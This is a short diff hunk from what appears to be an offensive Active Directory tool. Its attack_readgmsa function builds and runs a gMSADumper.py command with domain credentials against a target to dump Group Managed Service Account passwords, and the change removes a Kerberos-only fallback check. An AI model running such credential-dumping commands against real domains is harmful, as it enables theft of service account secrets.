@@ -80,10 +80,6 @@ def attack_readgmsa(session, *parts):
             f"python3 gMSADumper.py {session.domain}/{session.username}:{session.password} "
             f"@{session.target_ip}"
         )
-    else:
-        print(yellow("[!] Kerberos-only auth detected. gMSADumper fallback not supported."))
-        return
-
     out, err = run_command(fallback_cmd)
     combined = out + "\n" + err
 
